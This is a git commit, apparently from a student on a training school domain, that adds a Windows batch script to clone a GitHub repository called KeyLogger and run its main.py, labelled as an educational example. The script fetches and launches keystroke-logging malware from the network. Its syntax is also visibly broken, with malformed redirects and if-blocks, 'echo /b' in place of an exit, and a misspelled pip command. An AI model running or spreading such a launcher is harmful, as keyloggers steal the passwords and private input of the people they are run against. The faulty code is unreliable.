2c00175d5efae2cdff4396121c372f870edfc891
N4322 <N4322@ITStepZT.local>
2025-12-07 14:38:13 +0200

    keylogger for educatinal example

---
+++ setup_env.bat
@@ -0,0 +1,34 @@
+
+git --version >nul 2>&1
+if errorlevel 1(
+    echo Git is not installed, please install git
+    echo /b
+ )
+
+ python --version >nul 2>&11
+ if errorlevel 1(
+ echo Python is not installed. Please install it first
+ echo /b
+ )
+
+ echo Clonning the Keylogger...
+ git clone https://github.com/lagovskaana-dotcom/KeyLogger
+
+ cd KeyLogger
+ py -m venv venv
+ if not exist requirements.txt(
+ echo requirements.txt is not found.
+ ) else(
+  echo Installing the libs...
+  venv\Scripts/pip instal -r requirements.txt
+ )
+
+ echo Activating virtual envrionments..
+ if "%ComSpec%" == ""(
+ venv\ Scripts\activate
+ )
+
+ echo Project is starting...
+ py main.py
+
+
